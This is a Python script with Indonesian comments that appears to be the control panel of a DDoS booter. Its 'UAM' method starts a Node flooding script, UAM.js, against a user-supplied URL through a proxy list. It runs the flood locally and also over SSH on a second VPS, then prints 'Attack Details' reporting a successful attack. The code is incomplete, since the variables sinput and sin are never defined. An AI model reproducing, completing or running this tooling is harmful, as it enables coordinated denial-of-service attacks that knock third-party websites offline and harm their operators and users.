import paramiko
from datetime import datetime
import os

def run_attack_vps2(url, port, time):
    # Konfigurasi SSH ke VPS ke-2
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Ganti ini dengan informasi VPS ke-2
    vps2_host = 'IP_VPS_KE2'
    vps2_port = 22
    vps2_user = 'username_vps2'
    vps2_password = 'password_vps2'

    try:
        ssh.connect(vps2_host, port=vps2_port, username=vps2_user, password=vps2_password)
        command = f'cd .UAM && screen -dm timeout {time} node UAM.js {url} {time} 10 10 proxy.txt'
        stdin, stdout, stderr = ssh.exec_command(command)
        print(f"Command executed on VPS 2: {command}")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command on VPS 2: {str(e)}")

def main():
    # Bagian lain dari script tetap sama
    if sinput == "UAM" or sinput == "uam":
        try:
            url = sin.split()[1]
            port = sin.split()[2]
            time = sin.split()[3]
            start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"""
Attack Details
  Status:  \033[35m[\033[0m\033[32mSuccessfully Send Attack\033[0m\033[35m]\033[0m
  Host:    \033[35m[\033[0m{url}\033[35m]\033[0m
  Port:    \033[35m[\033[0m{port}\033[35m]\033[0m
  Time:    \033[35m[\033[0m{time}\033[35m]\033[0m
  Methods: \033[35m[\033[0m{sinput}\033[35m]\033[0m
  Running: \033[35m[\033[0m{start_time}\033[35m]\033[0m
""")
            os.system(f'cd .UAM && screen -dm timeout {time} node UAM.js {url} {time} 10 10 proxy.txt')
            # Jalankan script di VPS ke-2
            run_attack_vps2(url, port, time)
        except Exception as e:
            print(f"Failed to execute command: {str(e)}")

# Panggil fungsi main() kamu di sini
if __name__ == "__main__":
    main()